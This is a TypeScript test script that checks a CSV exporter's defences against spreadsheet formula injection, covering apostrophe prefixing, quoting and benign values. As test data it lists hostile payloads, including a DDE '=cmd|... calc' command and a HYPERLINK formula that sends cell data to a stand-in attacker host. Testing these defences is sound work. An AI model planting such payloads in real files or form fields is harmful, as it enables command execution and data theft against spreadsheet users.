/**
 * CSV formula injection (item 7).
 *
 * Run: npx tsx scripts/verify-csv.ts   (or: npm run check:csv)
 *
 * The rows here are the ones an attacker would actually try: a passenger
 * name, a hotel note, a destination — any field a person types into a form
 * that later gets exported and opened in Excel.
 */
import { escapeCsvCell, neutralizeCsvCell } from '../src/lib/csv'

let failures = 0
function check(name: string, ok: boolean, detail = '') {
  if (ok) {
    console.log(`  PASS  ${name}`)
  } else {
    failures++
    console.error(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`)
  }
}

/** Every leading character OWASP names, plus a realistic payload for each. */
const DANGEROUS: Array<[label: string, payload: string]> = [
  ['=', "=cmd|' /C calc'!A0"],
  ['=', '=HYPERLINK("http://evil.example/?x="&A1,"click")'],
  ['+', '+1+1'],
  ['-', '-2+3+cmd|\' /C calc\'!A0'],
  ['@', '=SUM(1)+1@import'],
  ['tab', '\t=1+1'],
  ['CR', '\r=1+1'],
  ['LF', '\n=1+1'],
]

function main() {
  console.log('neutralizeCsvCell — the eight leading characters')
  for (const [label, payload] of DANGEROUS) {
    const out = neutralizeCsvCell(payload)
    check(
      `leading ${label} is prefixed with an apostrophe`,
      out === `'${payload}`,
      JSON.stringify(out)
    )
    check(
      `leading ${label} no longer starts with the dangerous character`,
      !['=', '+', '-', '@', '\t', '\r', '\n'].includes(out[0])
    )
  }

  console.log('neutralizeCsvCell — what must be left alone')
  check('a plain name is untouched', neutralizeCsvCell('Mohamed Ali') === 'Mohamed Ali')
  check('an Arabic name is untouched', neutralizeCsvCell('محمد علي') === 'محمد علي')
  check('a number is untouched', neutralizeCsvCell('1250') === '1250')
  check('a decimal is untouched', neutralizeCsvCell('1250.50') === '1250.50')
  check('an empty string stays empty', neutralizeCsvCell('') === '')
  check('null becomes an empty cell', neutralizeCsvCell(null) === '')
  check('undefined becomes an empty cell', neutralizeCsvCell(undefined) === '')
  check(
    'a danger character in the middle is untouched',
    neutralizeCsvCell('note = see attached') === 'note = see attached'
  )
  check(
    'a leading space is neutralised too (some importers trim before scanning)',
    neutralizeCsvCell(' =1+1') === `' =1+1`,
    JSON.stringify(neutralizeCsvCell(' =1+1'))
  )
  check(
    'a leading space on ordinary text is left alone',
    neutralizeCsvCell(' Mohamed Ali') === ' Mohamed Ali'
  )

  console.log('escapeCsvCell — neutralise, then quote, in that order')
  const dangerous = "=cmd|' /C calc'!A0"
  const quoted = escapeCsvCell(dangerous)
  check(
    'the apostrophe lands before the formula',
    quoted === `'${dangerous}`,
    JSON.stringify(quoted)
  )
  check(
    'it no longer begins with a formula character',
    !['=', '+', '-', '@', '\t', '\r', '\n'].includes(quoted[0])
  )
  // Quoting is a CSV-grammar concern, not a defence: this payload has no
  // comma or newline, so it is emitted bare — with the apostrophe in front.
  const withComma = escapeCsvCell('=A1,B1')
  check('a comma still gets the cell quoted', withComma === `"'=A1,B1"`, JSON.stringify(withComma))
  const withQuote = escapeCsvCell('=say "hi"')
  check('embedded quotes are doubled', withQuote === `"'=say ""hi"""`, JSON.stringify(withQuote))
  const withNewline = escapeCsvCell('\n=1+1')
  check(
    'a leading newline survives neutralisation and quoting',
    withNewline === '"\'\n=1+1"',
    JSON.stringify(withNewline)
  )
  check('a benign cell is not quoted', escapeCsvCell('Cairo') === 'Cairo')

  console.log('a whole row, as the exporter builds it')
  const row = [
    'BR-0001',
    '=cmd|\' /C calc\'!A0', // passenger name
    'Grand Hotel = 5 stars', // hotel note (middle-of-string = is fine)
    '-120', // negative amount: becomes text — see the trade-off below
  ].map(escapeCsvCell)
  const csv = row.join(',')
  const cells = csv.split(',')
  check('the name cell cannot start a formula', cells[1].startsWith(`'=`), JSON.stringify(cells[1]))
  check('the note cell passes through unchanged', cells[2] === 'Grand Hotel = 5 stars')
  check(
    'the negative amount is neutralised (the documented trade-off: it becomes text)',
    cells[3] === `'-120`,
    JSON.stringify(cells[3])
  )

  console.log('')
  if (failures > 0) {
    console.error(`${failures} check(s) failed`)
    process.exit(1)
  }
  console.log('all checks passed')
}

main()
